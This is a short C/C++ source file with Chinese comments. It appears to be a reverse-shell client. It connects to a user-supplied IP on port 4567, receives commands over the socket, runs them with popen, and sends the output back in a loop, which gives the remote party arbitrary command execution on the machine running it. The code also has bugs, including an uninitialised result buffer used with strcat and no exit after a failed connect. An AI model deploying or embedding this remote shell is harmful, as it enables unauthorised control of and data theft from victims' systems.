#ifndef __WIN32
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#else
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#endif
#include <string>
#include <stdio.h>
#include <iostream>
#define PORT 4567
int main()
{
    int fd;
#ifndef __WIN32
    socklen_t sock_len;
#else
    int sock_len;
    WSADATA wsaData; // 初始化网络环境
    if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) //使用2.2版本socket
    {
        printf("初始化失败！");
        return 0;
    }
#endif
    sockaddr_in clientAddr;
    char ip[16];
    sock_len = sizeof(clientAddr);
    fd = socket(AF_INET, SOCK_STREAM, 0); //创建TCP连接
    if(fd == -1)
    {
        printf("创建失败！");
        return 0;
    }
    clientAddr.sin_family = AF_INET;
    clientAddr.sin_port = htons(PORT);
    printf("please enter IP address: ");
    scanf("%s", ip);
#ifndef __WIN32
    clientAddr.sin_addr.s_addr = inet_addr(ip);
#else
    clientAddr.sin_addr.S_un.S_addr = inet_addr(ip);
#endif
    if(connect(fd, (sockaddr *)&clientAddr, sock_len) == -1)
    {
        printf("连接失败！");
#ifndef __WIN32
        close(fd);
#else
        closesocket(fd);
#endif
    }
    const char *msg = "im from client";
    char buff[256];
    send(fd, msg, strlen(msg) + 1, 0);
    recv(fd, buff, sizeof(buff), 0);
    printf("%s\n", buff);
    FILE *fp = NULL;
    char cmd[1024];
    char buf[1024];
    char result[4096];
    while(1)
    {
        recv(fd, cmd, sizeof(cmd), 0);
        if((fp = popen(cmd, "r")) != NULL)
        {   
            while(fgets(buf, 1024, fp) != NULL)
            {
                strcat(result, buf);
            }
            pclose(fp);
            fp = NULL;
        }
        send(fd, result, sizeof(result), 0);
        memset(result, 0, 4096);
    }

#ifndef __WIN32
    close(fd);
#else
    closesocket(fd);
    WSACleanup(); //清理网络环境
#endif
    return 0;

}